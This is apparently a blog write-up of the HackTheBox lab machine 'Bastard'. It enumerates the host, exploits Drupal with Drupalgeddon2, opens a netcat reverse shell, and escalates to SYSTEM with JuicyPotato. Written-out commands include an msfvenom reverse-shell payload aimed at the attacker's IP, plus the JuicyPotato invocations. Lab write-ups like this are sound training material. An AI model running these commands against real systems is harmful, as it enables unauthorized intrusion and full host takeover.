---
layout: post
title: "Bastard Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Bastard

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.143.17 folder that I have attached to this post.

## Enumeration summary

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard

135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

![image-20210508080511757](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508080511757.png)

![image-20210508080707848](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508080707848.png)

```
Summary   : Microsoft-IIS[7.5], MetaGenerator[Drupal 7 (http://drupal.org)], Content-Language[en], JQuery, Drupal, Script[text/javascript], PasswordField[pass], X-Frame-Options[SAMEORIGIN], UncommonHeaders[x-content-type-options,x-generator], PHP[5.3.28,], HTTPServer[Microsoft-IIS/7.5], X-Powered-By[PHP/5.3.28, ASP.NET]
```

## Exploitation

```
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
```

Remeber drupalgadon2: https://github.com/lorddemon/drupalgeddon2/blob/master/drupalgeddon2.py, Well it works:

![image-20210508082901213](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508082901213.png)

Lets create a reverse shell from that. Downloaded netcat first:

![image-20210508084731558](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508084731558.png)

![image-20210508084748328](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508084748328.png)

And we have shell:

![image-20210508084848709](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508084848709.png)

Huhm okay that was user:

![image-20210508085126451](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508085126451.png)

Lets get to some privesc:

```
C:\Users\dimitris\Desktop>systeminfo
systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          8/5/2021, 3:02:25 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.527 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.536 MB
Virtual Memory: In Use:    559 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.143.17
                                 [02]: fe80::cd65:1834:2e72:f9b4
                                 [03]: dead:beef::cd65:1834:2e72:f9b4

```

Windows exploit suggester time;

```
kali@kali:~/Desktop/DownloadedScripts$ python windows-exploit-suggester.py --database 2021-05-08-mssb.xls --systeminfo sysinfo.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```

Sadly none of these options worked. But I did find this: 

```
C:\inetpub\drupal-7.54>whoami /priv 
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

C:\inetpub\drupal-7.54>

```

Aka juicypotato time.Generate a payload:

```
kali@kali:~/Desktop/DownloadedScripts$ msfvenom --platform Windows -p windows/x64/shell_reverse_tcp lhost=10.10.14.45 lport=9999 -f exe > shell.exe
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

Well we need to find the right clsid:

```
C:\inetpub\drupal-7.54>jp.exe -t * -p shell.exe -l 9999
jp.exe -t * -p shell.exe -l 9999
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9999
COM -> recv failed with error: 10038
```

We grab the first clsid from here that belongs to system https://github.com/ohpe/juicy-potato/tree/v0.1/Docs/CLSID/Windows_Server_2008_R2_Enterprise:

```
C:\inetpub\drupal-7.54>jp.exe -t * -p shell.exe -l 9999 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
jp.exe -t * -p shell.exe -l 9999 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 9999
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

And we roooooot:

![image-20210508100259497](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210508100259497.png)

## Final thoughts

How is this a medium machine. This is a 20 pointer on OSCP exam, but boy this was ez.
